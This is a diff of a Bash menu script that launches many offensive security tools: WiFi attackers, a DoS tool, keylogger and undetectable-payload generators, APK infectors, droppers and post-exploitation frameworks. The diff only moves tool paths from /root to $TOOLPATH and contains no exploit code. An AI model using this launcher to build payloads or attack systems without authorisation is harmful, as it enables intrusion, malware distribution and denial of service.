 		if [[ -d "/usr/share/fern-wifi-cracker" ]]
 		then
-			cd /root/Fern-Wifi-Cracker
+			cd $TOOLPATH/Fern-Wifi-Cracker
 			python execute.py
 			cd
 		else
@@ -3528,9 +3531,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "12" ]]
 	then
-		if [[ -d "/root/kickthemout" ]]
+		if [[ -d "$TOOLPATH/kickthemout" ]]
 		then
-			cd /root/kickthemout
+			cd $TOOLPATH/kickthemout
 			python kickthemout.py
 			cd
 		else
@@ -3547,7 +3550,7 @@ function wifi_tools
 	then
 		if [[ -d "/usr/share/ghost-phisher" ]]
 		then	
-			cd /root/ghost-phisher/Ghost-Phisher
+			cd $TOOLPATH/ghost-phisher/Ghost-Phisher
 			python ghost.py
 			cd
 		else
@@ -3562,9 +3565,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "14" ]]
 	then
-		if [[ -d "/root/The-Eye" ]]
+		if [[ -d "$TOOLPATH/The-Eye" ]]
 		then
-			cd /root/The-Eye
+			cd $TOOLPATH/The-Eye
 			./TheEye
 			cd
 		else
@@ -3579,7 +3582,7 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "15" ]]
 	then
-		if [[ -d "/root/xerxes" ]]
+		if [[ -d "$TOOLPATH/xerxes" ]]
 		then
 			echo -e "Do you own the site you want to DoS?"$YNONLY""
 			read DOSTERM
@@ -3595,7 +3598,7 @@ function wifi_tools
 				sleep 4
 				gio open http://www.isitdownrightnow.com/"$SITEDOS".html
 				clear	
-				cd /root/xerxes
+				cd $TOOLPATH/xerxes
 				SITEDOSX=www.$SITEDOS
 				echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
 				$READAK
@@ -3633,9 +3636,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "17" ]]
 	then
-		if [[ -d "/root/airgeddon" ]]
+		if [[ -d "$TOOLPATH/airgeddon" ]]
 		then
-			cd /root/airgeddon
+			cd $TOOLPATH/airgeddon
 			./airgeddon.sh
 			cd
 		else
@@ -3706,9 +3709,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "21" ]]
 	then
-		if [[ -d "/root/routersploit" ]]
+		if [[ -d "$TOOLPATH/routersploit" ]]
 		then
-			cd /root/routersploit
+			cd $TOOLPATH/routersploit
 			./rsf.py
 			cd
 		else
@@ -3723,9 +3726,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "22" ]]
 	then
-		if [[ -d "/root/nWatch" ]]
+		if [[ -d "$TOOLPATH/nWatch" ]]
 		then
-			cd /root/nWatch
+			cd $TOOLPATH/nWatch
 			python nwatch.py
 			cd
 		else
@@ -3740,9 +3743,9 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "23" ]]
 	then
-		if [[ -d "/root/eternal_scanner" ]]
+		if [[ -d "$TOOLPATH/eternal_scanner" ]]
 		then
-			cd /root/eternal_scanner
+			cd $TOOLPATH/eternal_scanner
 			./escan
 			cd
 		else
@@ -3757,7 +3760,7 @@ function wifi_tools
 		fi
 	elif [[ "$APPP" = "24" ]]
 	then
-		if [[ -d "/root/eaphammer" ]]
+		if [[ -d "$TOOLPATH/eaphammer" ]]
 		then
 			eaphammer_automation
 		else
@@ -3773,9 +3776,9 @@ function wifi_tools
 		cd
 	elif [[ "$APPP" = "25" ]]
 	then
-		if [[ -d "/root/VMR" ]]
+		if [[ -d "$TOOLPATH/VMR" ]]
 		then
-			cd /root/VMR
+			cd $TOOLPATH/VMR
 			./VMR-MDK-K2-2017R-012x2.sh
 		else
 			echo -e "$TNI"
@@ -3790,9 +3793,9 @@ function wifi_tools
 		cd
 	elif [[ "$APPP" = "26" ]]
 	then
-		if [[ -d "/root/netattack2" ]]
+		if [[ -d "$TOOLPATH/netattack2" ]]
 		then
-			cd /root/netattack2
+			cd $TOOLPATH/netattack2
 			python2 netattack2.py
 		else
 			echo -e "$TNI"
@@ -3823,9 +3826,9 @@ function wifi_tools
 		cd
 	elif [[ "$APPP" = "28" ]]
 	then
-		if [[ -d "/root/Gloom-Framework" ]]
+		if [[ -d "$TOOLPATH/Gloom-Framework" ]]
 		then
-			cd /root/Gloom-Framework
+			cd $TOOLPATH/Gloom-Framework
 			python gloom.py
 		else
 			echo -e "$TNI"
@@ -3856,9 +3859,9 @@ function wifi_tools
 		cd
 	elif [[ "$APPP" = "30" ]]
 	then
-		if [[ -d "/root/SocialFish" ]]
+		if [[ -d "$TOOLPATH/SocialFish" ]]
 		then
-			cd /root/SocialFish
+			cd $TOOLPATH/SocialFish
 			python SocialFish.py
 		else
 			echo -e "$TNI"
@@ -3873,7 +3876,7 @@ function wifi_tools
 		cd
 	elif [[ "$APPP" = "7" ]]
 	then
-		if [[ -d "/root/hakkuframework" ]]
+		if [[ -d "$TOOLPATH/hakkuframework" ]]
 		then
 			while true
 			do
@@ -3970,37 +3973,37 @@ function remote_access
 	TERMINALTITLE="REMOTE ACCESS"
 	dash_calc
 	printf '\033]2;REMOTE ACCESS\a'
-	if [[ -d /root/BeeLogger ]]
+	if [[ -d $TOOLPATH/BeeLogger ]]
 	then
 		echo -e ""$YS" 1"$CE") BeeLogger             Generate Gmail Emailing Keyloggers to Windows"
 	else
 		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"             Generate Gmail Emailing Keyloggers to Windows"
 	fi
-	if [[ -d /root/ezsploit ]]
+	if [[ -d $TOOLPATH/ezsploit ]]
 	then
 		echo -e ""$YS" 2"$CE") Ezsploit              Automation for metasploit"
 	else
 		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"              Automation for metasploit"
 	fi
-	if [[ -d /root/pupy ]]
+	if [[ -d $TOOLPATH/pupy ]]
 	then
 		echo -e ""$YS" 3"$CE") Pupy                  Remote administration and post-exploitation tool"
 	else
 		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"                  Remote administration and post-exploitation tool"
 	fi
-	if [[ -d /root/zirikatu ]]
+	if [[ -d $TOOLPATH/zirikatu ]]
 	then
 		echo -e ""$YS" 4"$CE") Zirikatu              Fud Payload generator script"
 	else
 		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"              Fud Payload generator script"
 	fi
-	if [[ -d /root/TheFatRat ]]
+	if [[ -d $TOOLPATH/TheFatRat ]]
 	then
 		echo -e ""$YS" 5"$CE") TheFatRat             Generate undetectable payloads"
 	else
 		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"             Generate undetectable payloads"
 	fi
-	if [[ -d /root/Winpayloads ]]
+	if [[ -d $TOOLPATH/Winpayloads ]]
 	then
 		echo -e ""$YS" 6"$CE") Winpayloads           Generate undetectable payloads"
 	else
@@ -4012,67 +4015,67 @@ function remote_access
 	else
 		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"              Inject payload into .exe"
 	fi
-	if [[ -d /root/CHAOS ]]
+	if [[ -d $TOOLPATH/CHAOS ]]
 	then
 		echo -e ""$YS" 8"$CE") CHAOS                 Generate payloads/listeners"
 	else
 		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"                 Generate payloads/listeners"
 	fi
-	if [[ -d /root/kwetza ]]
+	if [[ -d $TOOLPATH/kwetza ]]
 	then
 		echo -e ""$YS" 9"$CE") Kwetza                Inject payload to apk"
 	else
 		echo -e ""$RS" 9"$CE") "$RS"Kwetza"$CE"                Inject payload to apk"
 	fi
-	if [[ -d /root/koadic ]]
+	if [[ -d $TOOLPATH/koadic ]]
 	then
 		echo -e ""$YS"10"$CE") Koadic                Windows post-exploitation rootkit"
 	else
 		echo -e ""$RS"10"$CE") "$RS"Koadic"$CE"                Windows post-exploitation rootkit"
 	fi
-	if [[ -d /root/Empire ]]
+	if [[ -d $TOOLPATH/Empire ]]
 	then
 		echo -e ""$YS"11"$CE") Empire                PowerShell and Python post-exploitation agent"
 	else
 		echo -e ""$RS"11"$CE") "$RS"Empire"$CE"                PowerShell and Python post-exploitation agent"
 	fi
-	if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
+	if [[ -d $TOOLPATH/Meterpreter_Paranoid_Mode-SSL ]]
 	then
 		echo -e ""$YS"12"$CE") Meterpreter Paranoid  Meterpreter Paranoid Mode - SSL/TLS connections"
 	else
 		echo -e ""$RS"12"$CE") "$RS"Meterpreter Paranoid"$CE"  Meterpreter Paranoid Mode - SSL/TLS connections"
 	fi
-	if [[ -d /root/Dr0p1t-Framework ]]
+	if [[ -d $TOOLPATH/Dr0p1t-Framework ]]
 	then
 		echo -e ""$YS"13"$CE") Dr0p1t-Framework      Create an advanced stealthy dropper"
 	else
 		echo -e ""$RS"13"$CE") "$RS"Dr0p1t-Framework"$CE"      Create an advanced stealthy dropper"
 	fi
-	if [[ -d /root/Veil ]]
+	if [[ -d $TOOLPATH/Veil ]]
 	then
 		echo -e ""$YS"14"$CE") Veil-Framework        Generate payloads that bypass common anti-virus"
 	else
 		echo -e ""$RS"14"$CE") "$RS"Veil-Framework"$CE"        Generate payloads that bypass common anti-virus"
 	fi
-	if [[ -d /root/leviathan ]]
+	if [[ -d $TOOLPATH/leviathan ]]
 	then
 		echo -e ""$YS"15"$CE") Leviathan             Wide range mass audit toolkit"
 	else
 		echo -e ""$RS"15"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
 	fi
-	if [[ -d /root/FakeImageExploiter ]]
+	if [[ -d $TOOLPATH/FakeImageExploiter ]]
 	then
 		echo -e ""$YS"16"$CE") FakeImageExploiter    Use a Fake image.jpg to exploit targets"
 	else
 		echo -e ""$RS"16"$CE") "$RS"FakeImageExploiter"$CE"    Use a Fake image.jpg to exploit targets"
 	fi
-	if [[ -d /root/avet ]]
+	if [[ -d $TOOLPATH/avet ]]
 	then
 		echo -e ""$YS"17"$CE") Avet                  AntiVirus Evasion Tool"
 	else
 		echo -e ""$RS"17"$CE") "$RS"Avet"$CE"                  AntiVirus Evasion Tool"
 	fi
-	if [[ -d /root/ARCANUS ]]
+	if [[ -d $TOOLPATH/ARCANUS ]]
 	then
 		echo -e ""$YS"18"$CE") Arcanus               Customized payload generator/handler"
 	else
@@ -4084,31 +4087,31 @@ function remote_access
 	else
 		echo -e ""$RS"19"$CE") "$RS"MSFPC"$CE"                 MSFvenom Payload Creator"
 	fi
-	if [[ -d /root/morphHTA ]]
+	if [[ -d $TOOLPATH/morphHTA ]]
 	then
 		echo -e ""$YS"20"$CE") morphHTA              Morphing Cobalt Strike's evil.HTA"
 	else
 		echo -e ""$RS"20"$CE") "$RS"morphHTA"$CE"              Morphing Cobalt Strike's evil.HTA"
 	fi
-	if [[ -d /root/LFISuite ]]
+	if [[ -d $TOOLPATH/LFISuite ]]
 	then
 		echo -e ""$YS"21"$CE") LFISuite              Totally Automatic LFI Exploiter and Scanner"
 	else
 		echo -e ""$RS"21"$CE") "$RS"LFISuite"$CE"              Totally Automatic LFI Exploiter and Scanner"
 	fi
-	if [[ -d /root/UniByAv ]]
+	if [[ -d $TOOLPATH/UniByAv ]]
 	then
 		echo -e ""$YS"22"$CE") UniByAv               Generate undetectable executable from raw shellcode"
 	else
 		echo -e ""$RS"22"$CE") "$RS"UniByAv"$CE"               Generate undetectable executable from raw shellcode"
 	fi
-	if [[ -d /root/demiguise ]]
+	if [[ -d $TOOLPATH/demiguise ]]
 	then
 		echo -e ""$YS"23"$CE") Demiguise             HTA encryption tool for RedTeams"
 	else
 		echo -e ""$RS"23"$CE") "$RS"Demiguise"$CE"              HTA encryption tool for RedTeams"
 	fi
-	if [[ -d /root/DKMC ]]
+	if [[ -d $TOOLPATH/DKMC ]]
 	then
 		echo -e ""$YS"24"$CE") DKMC                  Malicious payload evasion tool into image"
 	else
@@ -4120,37 +4123,37 @@ function remote_access
 	else
 		echo -e ""$RS"25"$CE") "$RS"Beef"$CE"                   The browser exploitation framework"
 	fi
-	if [[ -d /root/Evil-Droid ]]
+	if [[ -d $TOOLPATH/Evil-Droid ]]
 	then
 		echo -e ""$YS"26"$CE") Evil-Droid            Penetrate android platforms"
 	else
 		echo -e ""$RS"26"$CE") "$RS"Evil-Droid"$CE"             Penetrate android platforms"
 	fi
-	if [[ -d /root/EggShell ]]
+	if [[ -d $TOOLPATH/EggShell ]]
 	then
 		echo -e ""$YS"27"$CE") EggShell              Penetrate android platforms"
 	else
 		echo -e ""$RS"27"$CE") "$RS"EggShell"$CE"               Penetrate android platforms"
 	fi
-	if [[ -d /root/Zerodoor ]]
+	if [[ -d $TOOLPATH/Zerodoor ]]
 	then
 		echo -e ""$YS"28"$CE") Zerodoor              Penetrate android platforms"
 	else
 		echo -e ""$RS"28"$CE") "$RS"Zerodoor"$CE"               Penetrate android platforms"
 	fi
-	if [[ -d /root/cromos ]]
+	if [[ -d $TOOLPATH/cromos ]]
 	then
 		echo -e ""$YS"29"$CE") Cromos                Download and Inject code into Google Chrome extensions"
 	else
 		echo -e ""$RS"29"$CE") "$RS"Cromos"$CE"                 Download and Inject code into Google Chrome extensions"
 	fi
-	if [[ -d /root/AutoSploit ]]
+	if [[ -d $TOOLPATH/AutoSploit ]]
 	then
 		echo -e ""$YS"30"$CE") AutoSploit            Automated Mass Exploiter"
 	else
 		echo -e ""$RS"30"$CE") "$RS"AutoSploit"$CE"             Automated Mass Exploiter"
 	fi
-	if [[ -d /root/Enigma ]]
+	if [[ -d $TOOLPATH/Enigma ]]
 	then
 		echo -e ""$YS"31"$CE") Enigma                Multiplatform payload dropper"
 	else
@@ -4164,9 +4167,9 @@ function remote_access
 	clear
 	if [[ "$KEYLOG" = "1" ]]
 	then
-		if [[ -d /root/BeeLogger ]]
+		if [[ -d $TOOLPATH/BeeLogger ]]
 		then
-			cd /root/BeeLogger
+			cd $TOOLPATH/BeeLogger
 			python bee.py
 			cd
 		else
@@ -4181,9 +4184,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "10" ]]
 	then
-		if [[ -d /root/koadic ]]
+		if [[ -d $TOOLPATH/koadic ]]
 		then
-			cd /root/koadic
+			cd $TOOLPATH/koadic
 			./koadic
 		else
 			echo -e "$TNI"
@@ -4197,9 +4200,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "11" ]]
 	then
-		if [[ -d /root/Empire ]]
+		if [[ -d $TOOLPATH/Empire ]]
 		then
-			cd /root/Empire
+			cd $TOOLPATH/Empire
 			./empire
 		else
 			echo -e "$TNI"
@@ -4213,9 +4216,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "12" ]]
 	then
-		if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
+		if [[ -d $TOOLPATH/Meterpreter_Paranoid_Mode-SSL ]]
 		then
-			cd /root/Meterpreter_Paranoid_Mode-SSL
+			cd $TOOLPATH/Meterpreter_Paranoid_Mode-SSL
 			./Meterpreter_Paranoid_Mode.sh
 		else
 			echo -e "$TNI"
@@ -4229,9 +4232,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "13" ]]
 	then
-		if [[ -d /root/Dr0p1t-Framework ]]
+		if [[ -d $TOOLPATH/Dr0p1t-Framework ]]
 		then
-			cd /root/Dr0p1t-Framework
+			cd $TOOLPATH/Dr0p1t-Framework
 			dropit_automation
 		else
 			echo -e "$TNI"
@@ -4245,9 +4248,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "14" ]]
 	then
-		if [[ -d /root/Veil ]]
+		if [[ -d $TOOLPATH/Veil ]]
 		then
-			cd /root/Veil
+			cd $TOOLPATH/Veil
 			./Veil.py
 		else
 			echo -e "$TNI"
@@ -4261,9 +4264,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "15" ]]
 	then
-		if [[ -d /root/leviathan ]]
+		if [[ -d $TOOLPATH/leviathan ]]
 		then
-			cd /root/leviathan
+			cd $TOOLPATH/leviathan
 			python leviathan.py
 		else
 			echo -e "$TNI"
@@ -4277,9 +4280,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "16" ]]
 	then
-		if [[ -d /root/FakeImageExploiter ]]
+		if [[ -d $TOOLPATH/FakeImageExploiter ]]
 		then
-			cd /root/FakeImageExploiter
+			cd $TOOLPATH/FakeImageExploiter
 			nano settings
 			./FakeImageExploiter.sh
 		else
@@ -4294,24 +4297,24 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "17" ]]
 	then
-		if [[ -d /root/avet ]]
+		if [[ -d $TOOLPATH/avet ]]
 		then
-			cd /root/avet/build
+			cd $TOOLPATH/avet/build
 			ls -1 build*
 			echo -e ""
 			echo -e "Type which one you want: "
 			read AVE
-			if [[ ! -f /root/avet/build/"$AVE" ]]
+			if [[ ! -f $TOOLPATH/avet/build/"$AVE" ]]
 			then
 				echo -e ""$RS"File not found"$CE""
 				sleep 2
 			else
-				nano /root/avet/build/"$AVE"
+				nano $TOOLPATH/avet/build/"$AVE"
 				echo -e "$PAKTC"
 				$READAK
-				cd /root/avet
+				cd $TOOLPATH/avet
 				./build/"$AVE"
-				gio open /root/avet
+				gio open $TOOLPATH/avet
 			fi
 		else
 			echo -e "$TNI"
@@ -4325,9 +4328,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "18" ]]
 	then
-		if [[ -d /root/ARCANUS ]]
+		if [[ -d $TOOLPATH/ARCANUS ]]
 		then
-			cd /root/ARCANUS
+			cd $TOOLPATH/ARCANUS
 			gnome-terminal -e "./ARCANUS & disown"
 		else	
 			echo -e "$TNI"
@@ -4494,7 +4497,7 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "20" ]]
 	then
-		if [[ -d /root/morphHTA ]]
+		if [[ -d $TOOLPATH/morphHTA ]]
 		then
 			while true 
 			do
@@ -4577,7 +4580,7 @@ function remote_access
 				break
 			done
 				clear
-				cd /root/morphHTA
+				cd $TOOLPATH/morphHTA
 				python morph-hta.py --in "$FPATH" --out "$M5" --mode "$M1" --maxstrlen "$M2" --maxvarlen "$M3" --maxnumsplit "$M4"
 				cd
 		else	
@@ -4592,9 +4595,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "21" ]]
 	then
-		if [[ -d /root/LFISuite ]]
+		if [[ -d $TOOLPATH/LFISuite ]]
 		then
-			cd /root/LFISuite
+			cd $TOOLPATH/LFISuite
 			python lfisuite.py
 		else	
 			echo -e "$TNI"
@@ -4608,7 +4611,7 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "22" ]]
 	then
-		if [[ -d /root/UniByAv ]]
+		if [[ -d $TOOLPATH/UniByAv ]]
 		then
 			while true
 			do
@@ -4655,8 +4658,8 @@ function remote_access
 						else
 							FC="process-evasion.json"
 						fi
-						cd /root/UniByAv
-						python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
+						cd $TOOLPATH/UniByAv
+						python UniByAv*.py "$RPATH" "$OUT" none $TOOLPATH/UniByAv/configs/"$FC"
 						break
 				else
 					#~ GCC=$(which gcc)
@@ -4682,8 +4685,8 @@ function remote_access
 						#~ else
 							#~ FC="process-evasion.json"
 						#~ fi
-						#~ cd /root/UniByAv
-						#~ python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
+						#~ cd $TOOLPATH/UniByAv
+						#~ python UniByAv*.py "$RPATH" "$OUT" none $TOOLPATH/UniByAv/configs/"$FC"
 						#~ break
 					#~ else
 						echo -e "Path to mingw32-gcc.exe : "
@@ -4708,13 +4711,13 @@ function remote_access
 						else
 							FC="process-evasion.json"
 						fi
-						cd /root/UniByAv
-						python UniByAv*.py "$RPATH" "$OUT" "$PGCC" /root/UniByAv/configs/"$FC"
+						cd $TOOLPATH/UniByAv
+						python UniByAv*.py "$RPATH" "$OUT" "$PGCC" $TOOLPATH/UniByAv/configs/"$FC"
 						break
 					#~ fi
 				fi	
 			done
-			cd /root/UniByAv
+			cd $TOOLPATH/UniByAv
 			python UniByAv*.py
 		else	
 			echo -e "$TNI"
@@ -4729,7 +4732,7 @@ function remote_access
 	
 	elif [[ "$KEYLOG" = "23" ]]
 	then
-		if [[ -d /root/demiguise ]]
+		if [[ -d $TOOLPATH/demiguise ]]
 		then
 			while true
 			do
@@ -4770,15 +4773,15 @@ function remote_access
 					clear
 					echo -e "Output file name: "
 					read FN
-					cd /root/demiguise
+					cd $TOOLPATH/demiguise
 					python demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
-					if [[ -f /root/demiguise/$FN ]]
+					if [[ -f $TOOLPATH/demiguise/$FN ]]
 					then
-						echo -e "Output file: /root/demiguise/"$FN""
+						echo -e "Output file: $TOOLPATH/demiguise/"$FN""
 					else
-						if [[ -f /root/demiguise/$FN.html ]]
+						if [[ -f $TOOLPATH/demiguise/$FN.html ]]
 						then
-							echo -e "Output file: /root/demiguise/"$FN".html"
+							echo -e "Output file: $TOOLPATH/demiguise/"$FN".html"
 						fi
 					fi					
 					break
@@ -4800,9 +4803,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "24" ]]
 	then
-		if [[ -d /root/DKMC ]]
+		if [[ -d $TOOLPATH/DKMC ]]
 		then
-			cd /root/DKMC
+			cd $TOOLPATH/DKMC
 			python dkmc.py
 		else	
 			echo -e "$TNI"
@@ -4832,9 +4835,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "26" ]]
 	then
-		if [[ -d /root/Evil-Droid ]]
+		if [[ -d $TOOLPATH/Evil-Droid ]]
 		then
-			cd /root/Evil-Droid
+			cd $TOOLPATH/Evil-Droid
 			./evil-droid
 		else	
 			echo -e "$TNI"
@@ -4848,9 +4851,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "27" ]]
 	then
-		if [[ -d /root/EggShell ]]
+		if [[ -d $TOOLPATH/EggShell ]]
 		then
-			cd /root/EggShell
+			cd $TOOLPATH/EggShell
 			python eggshell.py
 		else	
 			echo -e "$TNI"
@@ -4864,9 +4867,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "28" ]]
 	then
-		if [[ -d /root/Zerodoor ]]
+		if [[ -d $TOOLPATH/Zerodoor ]]
 		then
-			cd /root/Zerodoor
+			cd $TOOLPATH/Zerodoor
 			python zerodoor.py
 		else	
 			echo -e "$TNI"
@@ -4880,9 +4883,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "29" ]]
 	then
-		if [[ -d /root/cromos ]]
+		if [[ -d $TOOLPATH/cromos ]]
 		then
-			cd /root/cromos
+			cd $TOOLPATH/cromos
 			cromos_menu
 		else	
 			echo -e "$TNI"
@@ -4896,15 +4899,16 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "30" ]]
 	then
-		if [[ -d /root/AutoSploit ]]
+		if [[ -d $TOOLPATH/AutoSploit ]]
 		then
-			cd /root/AutoSploit
+			cd $TOOLPATH/AutoSploit
 			python autosploit.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
+				cd $TOOLPATH/Enigma
 				install_autosploit
 			else
 				continue
@@ -4912,15 +4916,16 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "31" ]]
 	then
-		if [[ -d /root/Enigma ]]
+		if [[ -d $TOOLPATH/Enigma ]]
 		then
-			cd /root/Enigma
+			cd $TOOLPATH/Enigma
 			python enigma.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
+				cd $TOOLPATH/Enigma
 				install_enigma
 			else
 				continue
@@ -4928,9 +4933,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "8" ]]
 	then
-		if [[ -d /root/CHAOS ]]
+		if [[ -d $TOOLPATH/CHAOS ]]
 		then
-			cd /root/CHAOS
+			cd $TOOLPATH/CHAOS
 			go run CHAOS.go
 		else
 			echo -e "$TNI"
@@ -4944,9 +4949,9 @@ function remote_access
 		fi	
 	elif [[ "$KEYLOG" = "9" ]]
 	then
-		if [[ -d /root/kwetza ]]
+		if [[ -d $TOOLPATH/kwetza ]]
 		then
-			cd /root/kwetza
+			cd $TOOLPATH/kwetza
 			printf '\033]2;KWETZA\a'
 			while true
 			do
@@ -4983,13 +4988,13 @@ function remote_access
 				clear
 				if [[ "$APKK" = 1 ]]
 				then
-					echo -e "Apk to infect(must be in /root/kwetza): "
+					echo -e "Apk to infect(must be in $TOOLPATH/kwetza): "
 					read APKTBI
 					if [[ -f "$APKTBI" ]]
 					then
 						APK="$APKTBI"
 					else
-						echo -e ""$RS"/root/kwetza/"$APKTBI" not found"$CE""
+						echo -e ""$RS"$TOOLPATH/kwetza/"$APKTBI" not found"$CE""
 						sleep 3
 					fi
 				elif [[ "$APKK" = 2 ]]
@@ -5039,7 +5044,7 @@ function remote_access
 						sleep 3
 						continue
 					fi
-					cd /root/kwetza
+					cd $TOOLPATH/kwetza
 					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
 					echo -e "$PAKTGB"
 					$READAK
@@ -5072,9 +5077,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "2" ]]
 	then
-		if [[ -d /root/ezsploit ]]
+		if [[ -d $TOOLPATH/ezsploit ]]
 		then
-			cd /root/ezsploit/
+			cd $TOOLPATH/ezsploit/
 			./ezsploit.sh
 			cd
 			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
@@ -5094,7 +5099,7 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "3" ]]
 	then
-		if [[ -d /root/pupy ]]
+		if [[ -d $TOOLPATH/pupy ]]
 		then
 			while true
 			do
@@ -5137,12 +5142,12 @@ function remote_access
 				clear
 				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
 				read -e PUPYPATH
-				cd /root/pupy/pupy
+				cd $TOOLPATH/pupy/pupy
 				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
 				cd
 			elif [[ "$PUPY" = "2" ]]
 			then
-				cd /root/pupy/pupy
+				cd $TOOLPATH/pupy/pupy
 				./pupysh.py
 			elif [[ "$PUPY" = "00" ]]
 			then
@@ -5167,7 +5172,7 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "4" ]]
 	then
-		if [[ -d /root/zirikatu ]]
+		if [[ -d $TOOLPATH/zirikatu ]]
 		then
 			clear
 			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
@@ -5177,7 +5182,7 @@ function remote_access
 			if [[ "$MUSTBEYES" = "YES" ]] 
 			then 
 				clear
-				cd /root/zirikatu
+				cd $TOOLPATH/zirikatu
 				./zirikatu.sh
 				cd
 			fi
@@ -5193,7 +5198,7 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "5" ]]
 	then
-		if [[ -d /root/TheFatRat ]]
+		if [[ -d $TOOLPATH/TheFatRat ]]
 		then
 			fatrat
 		else
@@ -5208,9 +5213,9 @@ function remote_access
 		fi
 	elif [[ "$KEYLOG" = "6" ]]
 	then
-		if [[ -d /root/Winpayloads ]]
+		if [[ -d $TOOLPATH/Winpayloads ]]
 		then
-			cd /root/Winpayloads
+			cd $TOOLPATH/Winpayloads
 			./WinPayloads.py
 			cd
 		else
@@ -5253,37 +5258,37 @@ function information_gathering
 		else
 			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE"                Automated Pentest Recon Scanner"
 		fi
-		if [[ -d /root/ReconDog ]]
+		if [[ -d $TOOLPATH/ReconDog ]]
 		then
 			echo -e ""$YS" 2"$CE") ReconDog              All in one tool"
 		else
 			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE"              All in one tool"
 		fi
-		if [[ -d /root/RED_HAWK ]]
+		if [[ -d $TOOLPATH/RED_HAWK ]]
 		then
 			echo -e ""$YS" 3"$CE") RED HAWK              All in one tool"
 		else
 			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE"              All in one tool"
 		fi
-		if [[ -d /root/Infoga ]]
+		if [[ -d $TOOLPATH/Infoga ]]
 		then
 			echo -e ""$YS" 4"$CE") Infoga                Email Information Gathering"
 		else
 			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE"                Email Information Gathering"
 		fi
-		if [[ -d /root/KnockMail ]]
+		if [[ -d $TOOLPATH/KnockMail ]]
 		then
 			echo -e ""$YS" 5"$CE") KnockMail             Verify if email exists"
 		else
 			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE"             Verify if email exists"
 		fi
-		if [[ -d /root/operative-framework ]]
+		if [[ -d $TOOLPATH/operative-framework ]]
 		then
 			echo -e ""$YS" 6"$CE") Operative-framework   Get information on website or target"
 		else
 			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE"   Get information on website or target"
 		fi
-		if [[ -d /root/osrframework ]]
+		if [[ -d $TOOLPATH/osrframework ]]
 		then
 			echo -e ""$YS" 7"$CE") Osrfconsole           Perform accurate online researches"
 		else
@@ -5314,9 +5319,9 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = 2 ]]
 		then
-			if [[ -d /root/ReconDog ]]
+			if [[ -d $TOOLPATH/ReconDog ]]
 			then
-				cd /root/ReconDog
+				cd $TOOLPATH/ReconDog
 				python dog.py
 				cd
 			else
@@ -5331,9 +5336,9 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = 3 ]]
 		then
-			if [[ -d /root/RED_HAWK ]]
+			if [[ -d $TOOLPATH/RED_HAWK ]]
 			then
-				cd /root/RED_HAWK
+				cd $TOOLPATH/RED_HAWK
 				php rhawk.php
 				cd
 			else
@@ -5349,14 +5354,14 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = 4 ]]
 		then
-			if [[ -d /root/Infoga ]]
+			if [[ -d $TOOLPATH/Infoga ]]
 			then
 				echo -e "Domain to search:"
 				read INFOTARG
